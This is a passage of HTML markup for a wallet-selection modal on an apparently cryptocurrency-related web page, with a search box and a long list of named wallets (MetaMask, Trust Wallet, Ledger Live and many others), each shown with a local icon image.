                  vector-effect="none"
                  paint-order="stroke fill markers"
                ></path>
              </g>
            </svg>

                        <input type="text" id="searchbox" onkeyup="searchSelection(this.value)" placeholder="Search wallet" class="rounded-pill form-control" />
                        <svg class="cancel" height="16" viewBox="0 0 311 311.07733" width="16" xmlns="http://www.w3.org/2000/svg" id="fi_1828747">
              <path
                d="m16.035156 311.078125c-4.097656 0-8.195312-1.558594-11.308594-4.695313-6.25-6.25-6.25-16.382812 0-22.632812l279.0625-279.0625c6.25-6.25 16.382813-6.25 22.632813 0s6.25 16.382812 0 22.636719l-279.058594 279.058593c-3.136719 3.117188-7.234375 4.695313-11.328125 4.695313zm0 0"
              ></path>
              <path
                d="m295.117188 311.078125c-4.097657 0-8.191407-1.558594-11.308594-4.695313l-279.082032-279.058593c-6.25-6.253907-6.25-16.386719 0-22.636719s16.382813-6.25 22.636719 0l279.058594 279.0625c6.25 6.25 6.25 16.382812 0 22.632812-3.136719 3.117188-7.230469 4.695313-11.304687 4.695313zm0 0"
              ></path>
            </svg>
                    </div>
                </div>

                <div class="hidden modal-main-menu" id="wallets-container">
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="metamask" src="./img/MetaMask.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">MetaMask</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="trust wallet" src="./img/Trust_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Trust Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="safe" src="./img/Safe.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Safe</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="rainbow" src="./img/Rainbow.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Rainbow</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="uniswap wallet" src="./img/Uniswap_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Uniswap Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="zerion" src="./img/Zerion.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Zerion</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="imtoken" src="./img/imToken.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">imToken</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="argent" src="./img/Argent.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Argent</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="spot" src="./img/Spot.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Spot</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="crypto.com | defi wallet" src="./img/Crypto_com_DeFi_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Crypto.com | DeFi Wallet</span
              >
            </div>
          </div>
          <div class="menu-el">
            <div class="modal-icon">
              <img
                alt="okx wallet"
                src="./img/OKX_Wallet.png"
              />
            </div>
            <div class="modal-el-desc">
              <span class="modal-el-desc-first">OKX Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="tokenpocket" src="./img/TokenPocket.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">TokenPocket</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="robinhood wallet" src="./img/Robinhood_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Robinhood Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="frontier" src="./img/Frontier.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Frontier</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="blockchain.com" src="./img/Blockchain_com.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Blockchain.com</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="safepal" src="./img/SafePal.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">SafePal</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="omni" src="./img/Omni.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Omni</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="1inch wallet" src="./img/1inch_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">1inch Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="binance web3 wallet" src="./img/Binance_Web3_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Binance Web3 Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="exodus" src="./img/Exodus.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Exodus</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="ledger live" src="./img/Ledger_Live.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Ledger Live</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="mew wallet" src="./img/MEW_wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">MEW wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="alphawallet" src="./img/AlphaWallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">AlphaWallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="keyring pro" src="./img/KEYRING_PRO.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">KEYRING PRO</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="lobstr wallet" src="./img/LOBSTR_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">LOBSTR Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="onto" src="./img/ONTO.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">ONTO</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="mathwallet" src="./img/MathWallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">MathWallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="unstoppable domains" src="./img/Unstoppable_Domains.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Unstoppable Domains</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="obvious" src="./img/Obvious.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Obvious</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="fireblocks" src="./img/Fireblocks.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Fireblocks</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="infinity wallet" src="./img/Infinity_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Infinity Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="bridge wallet" src="./img/Bridge_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Bridge Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="now wallet" src="./img/NOW_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">NOW Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="bitcoin.com wallet" src="./img/Bitcoin_com_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Bitcoin.com Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="abc wallet" src="./img/ABC_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">ABC Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="ottr finance" src="./img/Ottr_Finance.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Ottr Finance</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="arculus wallet" src="./img/Arculus_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Arculus Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="cobalt wallet" src="./img/Cobalt_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Cobalt Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="chain" src="./img/Chain.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Chain</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="huddln" src="./img/Huddln.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Huddln</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="verso" src="./img/Verso.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Verso</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="jade wallet" src="./img/Jade_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Jade Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="modular wallet prod" src="./img/Modular_Wallet_Prod.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Modular Wallet Prod</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="kelp" src="./img/Kelp.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Kelp</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="cling wallet" src="./img/Cling_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Cling Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="coinomi" src="./img/Coinomi.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Coinomi</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="sabay wallet app" src="./img/Sabay_Wallet_App.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Sabay Wallet App</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="tokoin | my-t wallet" src="./img/Tokoin_My_T_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Tokoin | My-T Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="impersonator" src="./img/Impersonator.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Impersonator</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="copiosa" src="./img/Copiosa.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Copiosa</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="imota " src="./img/Imota_.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Imota</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="libera" src="./img/Libera.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Libera</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="certhis" src="./img/Certhis.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Certhis</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="burrito wallet" src="./img/Burrito_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Burrito Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="ancrypto" src="./img/Ancrypto.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Ancrypto</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="cypherock cysync" src="./img/Cypherock_cySync.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Cypherock cySync</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="cypher wallet" src="./img/Cypher_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Cypher Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="status" src="./img/Status.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Status</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="enjin wallet" src="./img/Enjin_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Enjin Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="essentials" src="./img/Essentials.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Essentials</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="blockwallet" src="./img/BlockWallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">BlockWallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="kriptomat" src="./img/Kriptomat.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Kriptomat</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="oxalus wallet" src="./img/Oxalus_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Oxalus Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="theta wallet" src="./img/Theta_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Theta Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="rabby" src="./img/Rabby.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Rabby</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="leap cosmos wallet" src="./img/Leap_Cosmos_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Leap Cosmos Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="wirex wallet" src="./img/Wirex_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Wirex Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="bcertin wallet" src="./img/BCERTin_wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">BCERTin wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="monarch wallet" src="./img/Monarch_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Monarch Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="filwallet" src="./img/FILWallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">FILWallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="coincircle" src="./img/CoinCircle.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">CoinCircle</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="mywallid" src="./img/MyWalliD.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">MyWalliD</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="brise wallet" src="./img/BRISE_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">BRISE Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="snowball" src="./img/Snowball.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Snowball</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="gamestop wallet" src="./img/GameStop_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">GameStop Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="ballet crypto" src="./img/Ballet_Crypto.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Ballet Crypto</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="realt wallet" src="./img/RealT_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">RealT Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="enno wallet" src="./img/Enno_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Enno Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="nitrogen wallet" src="./img/Nitrogen_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Nitrogen Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="a4 wallet" src="./img/A4_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">A4 Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="dohrnii wallet" src="./img/Dohrnii_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Dohrnii Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="localtrade wallet" src="./img/LocalTrade_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">LocalTrade Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="xcapit" src="./img/Xcapit.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Xcapit</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="bc vault" src="./img/BC_Vault.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">BC Vault</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="neon wallet" src="./img/Neon_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Neon Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="absolute wallet" src="./img/Absolute_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Absolute Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="locker token" src="./img/Locker_Token.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Locker Token</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="sequence wallet" src="./img/Sequence_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Sequence Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="linen" src="./img/Linen.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Linen</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="nabox" src="./img/Nabox.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Nabox</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="marble" src="./img/Marble.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Marble</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="cryptnox wallet" src="./img/Cryptnox_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Cryptnox Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="ownbit" src="./img/Ownbit.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Ownbit</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="id pocket" src="./img/ID_Pocket.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">ID Pocket</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="flooz" src="./img/Flooz.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Flooz</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="aton" src="./img/ATON.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">ATON</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="keplr" src="./img/Keplr.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Keplr</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="brave wallet" src="./img/Brave_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Brave Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="crossmint" src="./img/Crossmint.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Crossmint</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="gryfyn" src="./img/Gryfyn.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Gryfyn</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="pier" src="./img/pier.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">pier</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="core" src="./img/Core.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Core</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="taho" src="./img/Taho.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Taho</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="torus" src="./img/Torus.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Torus</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="keeper" src="./img/Keeper.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Keeper</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="uniblow" src="./img/Uniblow.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Uniblow</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="d&#39;cent wallet" src="./img/D_CENT_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">D'CENT Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="paper" src="./img/Paper.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Paper</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="klever wallet" src="./img/Klever_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Klever Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="edge wallet" src="./img/Edge_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Edge Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="coingrig" src="./img/Coingrig.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Coingrig</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="xfun wallet" src="./img/XFUN_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">XFUN Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="ricewallet" src="./img/RiceWallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">RiceWallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="ancrypto wallet" src="./img/Ancrypto_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Ancrypto Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="okse wallet" src="./img/Okse_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Okse Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="aktionariat" src="./img/Aktionariat.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Aktionariat</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="zelus" src="./img/Zelus.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Zelus</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="talk+" src="./img/Talk_.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Talk+</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="card wallet" src="./img/Card_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Card Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="paybolt" src="./img/PayBolt.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">PayBolt</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="arianee wallet" src="./img/Arianee_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Arianee Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="slavi wallet" src="./img/Slavi_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Slavi Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="plasma wallet" src="./img/Plasma_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Plasma Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="iopay" src="./img/ioPay.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">ioPay</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="defiant" src="./img/Defiant.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Defiant</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="avacus" src="./img/Avacus.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Avacus</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="bytebank" src="./img/ByteBank.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">ByteBank</span>
                        </div>
                    </div>
